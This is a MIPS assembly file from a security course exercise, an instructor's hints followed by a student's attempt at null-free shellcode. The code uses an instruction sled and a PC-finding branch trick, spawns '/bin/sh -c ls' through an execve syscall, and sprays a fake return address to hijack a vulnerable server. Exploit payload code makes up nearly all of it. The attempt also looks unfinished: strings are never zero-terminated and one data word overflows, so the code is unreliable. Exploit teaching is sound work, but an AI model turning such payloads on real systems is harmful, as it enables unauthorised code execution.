# Starting point for Q1 shellcode.
#
#
# Q1 server program is different from the provided example in that
# commands are NULL-terminated strings rather than binary blobs.
# It means that the binary shellcode MUST NOT contain any zero bytes.
#
# Your task for Q1 is to modify shellcode progam in such a way that
# once assembled it does not contain any 0x00 bytes.
#
# You can achieve it by using MIPS instructions in innovative ways!
#
# Here is the list of *hints* to consider:
#
# 1) Although the default NOP instruction has code 0x00000000, you 
# can use any other instruction that does not affect program behaviour
# in place of NOP.
#
# 2) .data and .text section sizes must be a multiple of 16 bytes, 
# if your section is not a multiply of 16 bytes is size, assembler 
# and linker will automatically pad it with 0x00000000
#
# 3) strings cmd, amd_arg1, cmd_arg2 and the exec_args[] array must be 
# terminated with 0x00 and 0x000000 respectivewly. Since you cannot
# insert 0x00 into the shell code, you need to find a way to generate them
# at runtime
#
# 4) address of exec_args must begin at a multiply of 4. Assembler may 
# prepend it with some 0x00 if it is not.
#
# 5) if your immediate offsets in addiu and sw instructions contain 0x00s, 
# find a way to use negative offsets !!!
#
#
# 6) readup about the obscure parameter of MIPS syscall command (e.g. syscall 0x1). 
# Find out a way to use it!
#
# 7) Assemble this program using provided 'assemble' bash script
#    THEN EXAMINE GENERATED BINARY CODE using provided 'disassemble' bash script!
#
# Enjoy!
#
# Pavel Gladyshev

	sc_entry_point = 0x407F84FC   # fake return address for entry point into shellcode
                                     

	.text 
        .globl __start                # __start label is required by MIPS assember
                                      # it will correspond to the beginning of the buffer
__start:
	addu $t7, $t7, $t7
	sub $t7, $t7, $t7
	

	
	#li $s, 5
	#sub $t9, $t9, $t9
	xor $s4, $s4, $s4
	#beq $zero, $zero, next	      # unconditionally back to next:  $ra = address of next:
	
	beq $t9, $t9,next
	
	#xor $s4, $s4, $s4
	#xor $s4, $s4, $s4
	#xor $s4, $s4, $s4
	#xor $s4, $s4, $s4
	#xor $s4, $s4, $s4
	addu $t7, $t7, $t7
	sub $t7, $t7, $t7
	
	
	
        .repeat 255                   
		#xor $s4, $s4, $s4
		#xor $s4, $s4, $s4
		addu $t7, $t7, $t7
		sub $t7, $t7, $t7
		#addu $t7, $t7, $t7                 # Shellcode "Catchment area"
	.endr
	
	bal __start        # MIPS has no easy way to get 
                            # contents of PC, to overcome this we use
                           # "branch and link" instruction in an unconventional way:
                           # after this instruction is executed we get
                           #    PC=PC+8-0x408 = actual addr of __start, 
                           #    $ra = PC+4 = actual address of next (!!!)
                           
# All labels in this program are counted from address 0x00000000
# Assembler and linker assume that the label __start: points to address 0x00000000.
#
# The actual address of the shellcode program in memory is unknown 
# at the time of writing.  To ensure that the shellcode works as 
# expected, we need to determine the actual physical addresses of __start:
# at runtime, and use that address as the base for all memory accesses.
#
# The following code uses %lo(x) function to get lower (i.e. least significant) 16-bits
# of 32-bit label addresses. Since our program is very short, the most significant 16-bits
# are all 0000000000000000s anyway and they can be safely discarded. 
#
# The use of %lo(x) ensures that all li and addiu instructions are converted into 
# single-word machine instructions.   
  
next:
        li $t1,%lo(next)     # load the *value* of the label next: to $t1

                             # NOTE that the assembler and linker assume that __start: = 0x0000000, and
                             # we can *think* of the value of all labels in this progarm 
                             # as the *offsets* from 0x000000  !!!

	sub $t0,$ra,$t1      # Thus, we can calculate the *actual* address of __start: by subtracting 
                             # the value (offset) of the label next: from the actual address of label next:
                             # which is stored in $ra

	addiu $a0,$t0,%lo(cmd_arg1)     # $a0 = actual address of cmd_arg1 = $t1 (actual address of __start) +
                                        # + cmd_arg1 (which is the offset of cmd_arg1 from __start)

        	sw $a0,%lo(exec_args1)($t0)     # write actual address of cmd_arg1: into the actual location 
                                        # of exec_args1. Again we use exec_args1: value as an offset 
                                        # to be added to the actual locaiton of __start: which is in $t0
        	addiu $a0,$t0,%lo(cmd_arg2)
        	sw $a0,%lo(exec_args2)($t0)     # store actual address of cmd_arg2 into second element of 
                                        # exec_args array (of pointers)

        	addiu $a0,$t0,%lo(cmd)          # a0 = actual address of the file path to the executable    
        	sw $a0,%lo(exec_args0)($t0)     # store a0 into the initial element of exec_args array  

	addiu $a1,$t0,%lo(exec_args0)   # a1 = actual address of the exec_args array

       	
	#xori $a2, $t1, %lo(next) #set a2 = null
	
	#store zero bytes into final args
	#w $a2, %lo(exec_args_end)($t1)	
	
	addiu $a0,$t0, %lo(exec_args_end)
	sw $a0,%lo(exec_args_end)($t0)
	
	#move $a2,$a0                  # a2 = NULL	    
	
	li $v0,4011                     # $v0 = 4011 i.e. syscall execve(cmd, exec_args, NULL)
	#xor $s4, $s4, $s4
	
	#addu $t7, $t7, $t7
	#sub $t7, $t7, $t7
	
        syscall 0xFFFFF
	#nop				# required by syscall - will be automatically added if absent
	#nop                             # required by syscall - will be automatically added if absent

	#xor $s4, $s4, $s4
	#xor $s4, $s4, $s4
	#xor $s4, $s4, $s4
	#xor $s4, $s4, $s4
	addu $t7, $t7, $t7
	sub $t7, $t7, $t7
	addu $t7, $t7, $t7
	sub $t7, $t7, $t7
	addu $t7, $t7, $t7
	sub $t7, $t7, $t7
	

	
	.data
 
# Parameters of execve() system call 
# 
# Consult http://manpages.ubuntu.com/manpages/bionic/man2/execve.2.html
# ALSO CONSULT https://stackoverflow.com/questions/10068327/what-does-execve-do

# char *cmd - first argument to execve()


extra_5: 
	.word 0x55555555
	.word 0x55555555
cmd:
	.ascii "/bin/sh"    # file path to shell executable
	.byte 0xCC 
	.byte 0xCC 
	

# char *exec_args[] - second argument to execve()

cmd_arg1:    
        .ascii "-c"        # first argument to shell
        .byte 0xCC  
extra_2: 
	.word 0x55555555
	.word 0x55555555
	
cmd_arg2:
        .ascii "ls"      # second argument to shell (ls command)  
        .byte 0xCC 
        .byte 0xCC 

extra_3: 
	.word 0x55555555
	.word 0x55555555

exec_args0:
        .word  0x44444444   # this will be replaced by the actual address of cmd
exec_args1:
        .word  0x33333333   # this will be replaced by the actual address of cmd_arg1
extra_0: 
	.word 0x555555555
exec_args2:
        .word  0x22222222   # this will be replaces by the actual address of cmd_arg2
extra_1: 
	.word 0x55555555
exec_args_end:
        .word  0x11111111          # NULL signifies the end of char *exec_args[] contents

extra_4: 
	.word 0x55555555

	
	.repeat 251
        .word sc_entry_point   # area of fake return address
        .endr
